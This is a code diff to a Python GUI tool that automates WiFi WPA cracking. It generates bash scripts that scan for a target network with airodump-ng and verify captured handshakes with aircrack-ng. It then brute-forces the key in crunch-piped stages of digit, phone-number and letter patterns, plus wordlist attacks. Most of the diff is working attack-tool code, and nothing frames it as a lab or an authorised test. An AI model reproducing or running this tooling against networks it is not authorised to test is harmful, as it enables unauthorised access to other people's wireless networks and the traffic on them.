@@ -1126,17 +1126,19 @@ class MaximWindow(QMainWindow):
         script.write(f"  sleep 30\n")
         script.write(f"  kill $SCAN_PID 2>/dev/null; wait $SCAN_PID 2>/dev/null\n\n")
         # Parse CSV — with --essid filter, any BSSID line IS the target
+        # CSV fields: BSSID(1), First time(2), Last time(3), channel(4), ..., ESSID(14)
         script.write(f"  if [ -f '{scan_file}-01.csv' ]; then\n")
         script.write(f"    while IFS= read -r line; do\n")
         script.write(f"      B=$(echo \"$line\" | cut -d',' -f1 | tr -d ' ')\n")
         script.write(f"      C=$(echo \"$line\" | cut -d',' -f4 | tr -d ' ')\n")
+        script.write(f"      E=$(echo \"$line\" | cut -d',' -f14 | sed 's/^ *//')\n")
         script.write(f"      if echo \"$B\" | grep -qE '^([0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}}$'; then\n")
-        script.write(f"        BSSID=$B; CHANNEL=$C; break\n")
+        script.write(f"        BSSID=$B; CHANNEL=$C; ESSID_FOUND=\"$E\"; break\n")
         script.write(f"      fi\n")
         script.write(f"    done < '{scan_file}-01.csv'\n")
         script.write(f"  fi\n\n")
         script.write(f"  if [ -n \"$BSSID\" ]; then\n")
-        script.write(f"    echo \"[*] FOUND: BSSID=$BSSID  Channel=$CHANNEL\"\n")
+        script.write(f"    echo \"[*] FOUND: ESSID=$ESSID_FOUND  BSSID=$BSSID  Channel=$CHANNEL\"\n")
         script.write(f"    break\n")
         script.write(f"  fi\n")
         script.write(f"  echo \"[*] Attempt $ATTEMPT — '{essid}' not found yet, retrying...\"\n")
@@ -1176,30 +1178,35 @@ class MaximWindow(QMainWindow):
         # Open external terminal — GUI stays responsive
         self.runner.run_in_terminal(f"bash '{script.name}'")
 
-        # Poll for .cap file OR signal file — whichever appears first
+        # Poll for a .cap file that contains a VALID handshake
+        # (airodump creates .cap immediately, but handshake comes later)
         self._hs_essid_dir = essid_dir
-        self._hs_cap_seen = set()
-        # Record existing .cap files so we only trigger on NEW ones
-        import glob
-        for f in glob.glob(f"{essid_dir}/*.cap"):
-            self._hs_cap_seen.add(f)
-
         self._hs_poll_timer = QTimer()
         self._hs_poll_timer.timeout.connect(self._check_handshake_done)
-        self._hs_poll_timer.start(2000)  # Check every 2 seconds
+        self._hs_poll_timer.start(5000)  # Check every 5 seconds
+
+    def _cap_has_handshake(self, cap_file):
+        """Check if a .cap file contains a valid WPA handshake using aircrack-ng."""
+        try:
+            result = subprocess.run(
+                f"aircrack-ng '{cap_file}' 2>&1",
+                shell=True, capture_output=True, text=True, timeout=10
+            )
+            # aircrack-ng shows "1 handshake" when valid; reject "0 handshake"
+            return bool(re.search(r'[1-9]\d* handshake', result.stdout))
+        except Exception:
+            return False
 
     def _check_handshake_done(self):
-        """Poll for new .cap file in essid dir, then crack in internal output."""
+        """Poll .cap files for valid handshake, then kill terminal and crack internally."""
         import glob
         essid_dir = getattr(self, '_hs_essid_dir', None)
         if not essid_dir:
             self._hs_poll_timer.stop()
             return
 
-        # Method 1: Check signal file
+        # Check signal file for FAILED status
         signal_file = self._HS_SIGNAL_FILE
-        cap_file = None
-
         if os.path.exists(signal_file):
             try:
                 with open(signal_file, 'r') as f:
@@ -1207,30 +1214,28 @@ class MaximWindow(QMainWindow):
                 os.remove(signal_file)
             except Exception:
                 content = ""
-
-            if content and content not in ("FAILED", "NO_CAP") and os.path.exists(content):
-                cap_file = content
-            elif content in ("FAILED", "NO_CAP"):
+            if content == "FAILED":
                 self._hs_poll_timer.stop()
-                self.terminal.appendPlainText(f"\n[!] Handshake capture failed — no .cap file to crack.\n")
+                self._hs_essid_dir = None
+                self.terminal.appendPlainText(f"\n[!] Could not find network — capture failed.\n")
                 return
 
-        # Method 2: Check for new .cap files in the essid directory
-        if not cap_file:
-            current_caps = set(glob.glob(f"{essid_dir}/*.cap"))
-            new_caps = current_caps - self._hs_cap_seen
-            if new_caps:
-                # Pick the newest one
-                cap_file = max(new_caps, key=os.path.getmtime)
+        # Check all .cap files in essid dir for a valid handshake
+        cap_files = sorted(glob.glob(f"{essid_dir}/*.cap"), key=os.path.getmtime, reverse=True)
+        cap_file = None
+        for cf in cap_files:
+            if self._cap_has_handshake(cf):
+                cap_file = cf
+                break
 
         if not cap_file:
-            return  # Still waiting
+            return  # No valid handshake yet — keep waiting
 
-        # Found it — stop polling, kill external terminal, crack internally
+        # Valid handshake found — stop polling, kill external terminal, crack internally
         self._hs_poll_timer.stop()
         self._hs_essid_dir = None
 
-        # Kill the external capture terminal and all its children (airodump, aireplay, etc.)
+        # Kill the external capture terminal and all its children
         term_proc = getattr(self.runner, '_terminal_proc', None)
         if term_proc:
             try:
@@ -1473,22 +1478,23 @@ class MaximWindow(QMainWindow):
             # Each stage: crunch generates passwords, pipes to aircrack
             stages = [
                 ("Stage 1: 8-digit numbers (most common WiFi passwords)",
-                 f"crunch 8 8 0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                 f"crunch 8 8 0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
                 ("Stage 2: 8-char lowercase letters",
-                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz | aircrack-ng -w - -b auto '{filepath}'"),
                 ("Stage 3: 9-digit numbers",
-                 f"crunch 9 9 0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                 f"crunch 9 9 0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
                 ("Stage 4: 10-digit numbers (phone numbers)",
-                 f"crunch 10 10 0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                 f"crunch 10 10 0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
                 ("Stage 5: 8-char alphanumeric",
-                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b auto '{filepath}'"),
             ]
 
             for label, stage_cmd in stages:
                 script.write(f"\necho ''\necho '══════════════════════════════════════'\n")
                 script.write(f"echo '  {label}'\necho '══════════════════════════════════════'\n")
-                script.write(f"{stage_cmd}\n")
-                script.write(f"if [ $? -eq 0 ]; then\n  echo ''\n  echo '  KEY FOUND! Check output above.'\n  exit 0\nfi\n")
+                script.write(f"OUTPUT=$({stage_cmd} 2>&1)\n")
+                script.write(f"echo \"$OUTPUT\"\n")
+                script.write(f"if echo \"$OUTPUT\" | grep -q 'KEY FOUND!'; then\n  echo ''\n  echo '  KEY FOUND! Check output above.'\n  exit 0\nfi\n")
 
             script.write(f"\necho ''\necho '  Brute force complete — no password found in tested ranges.'\n")
             script.close()
@@ -1678,12 +1684,15 @@ class MaximWindow(QMainWindow):
 
         if tool == "aircrack":
             # aircrack-ng does NOT need sudo — it's a userspace tool
+            # aircrack-ng returns 0 even on failure, so grep for "KEY FOUND!" in output
             script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_crack_')
             script.write("#!/bin/bash\n\n")
             for i, wl in enumerate(wordlists, 1):
-                script.write(f"echo ''\necho '  [{i}] Wordlist: {os.path.basename(wl)}'\n")
-                script.write(f"aircrack-ng -w '{wl}' '{filepath}'\n")
-                script.write(f"if [ $? -eq 0 ]; then\n  echo ''\n  echo '  KEY FOUND!'\n  exit 0\nfi\n\n")
+                script.write(f"echo ''\necho '  [{i}/{len(wordlists)}] Wordlist: {os.path.basename(wl)}'\n")
+                script.write(f"OUTPUT=$(aircrack-ng -w '{wl}' '{filepath}' 2>&1)\n")
+                script.write(f"echo \"$OUTPUT\"\n")
+                script.write(f"if echo \"$OUTPUT\" | grep -q 'KEY FOUND!'; then\n")
+                script.write(f"  echo ''\n  echo '  KEY FOUND!'\n  exit 0\nfi\n\n")
             script.write("echo ''\necho '  Wordlists exhausted — no key found.'\n")
             script.close()
             os.chmod(script.name, 0o755)
